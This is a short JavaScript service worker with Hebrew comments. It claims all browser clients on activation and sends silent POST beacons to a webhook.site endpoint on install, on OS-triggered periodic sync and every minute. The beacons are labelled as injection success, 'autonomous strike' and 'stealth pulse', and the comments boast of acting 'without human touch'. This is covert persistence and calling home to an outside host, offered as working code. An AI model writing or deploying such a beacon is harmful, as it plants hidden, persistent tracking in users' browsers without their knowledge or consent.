const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
    // שליחת אות פריצה מיידי ללא מגע יד אדם
    pulse("AUTO_INJECTION_SUCCESS");
});

// סנכרון תקופתי שמופעל על ידי מערכת ההפעלה
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'owl-beacon') {
        event.waitUntil(pulse("AUTONOMOUS_STRIKE"));
    }
});

async function pulse(evt) {
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                event: evt,
                note: "ריבונות מוחלטת - ללא מגע יד אדם",
                ts: new Date().toISOString()
            })
        });
    } catch(e) {}
}

// גיבוי למקרה שהדף פתוח
setInterval(() => pulse("STEALTH_PULSE"), 60000);
